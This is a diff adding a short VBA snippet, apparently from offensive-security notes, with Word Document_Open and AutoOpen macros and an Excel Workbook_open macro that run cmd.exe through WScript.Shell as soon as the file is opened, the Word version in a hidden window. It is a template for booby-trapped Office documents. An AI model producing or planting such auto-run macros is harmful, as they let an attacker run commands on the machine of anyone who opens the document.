@@ -1,0 +1,29 @@
+\\Launches a command prompt on open (word) 
+
+
+Sub Document_Open()  
+	MyMacro  
+End Sub  
+
+Sub AutoOpen()  
+	MyMacro
+End Sub 
+
+Sub MyMacro()  
+	Dim str As String  
+	str = "cmd.exe"  
+	CreateObject("Wscript.Shell").Run str, 0  
+End Sub
+
+
+
+
+\\For Excel sub with WorkBook_open()
+
+ Private Sub Workbook_open()
+ 
+    Dim str As String
+    str = "cmd.exe"
+    CreateObject("Wscript.Shell").Run str
+    
+ End Sub
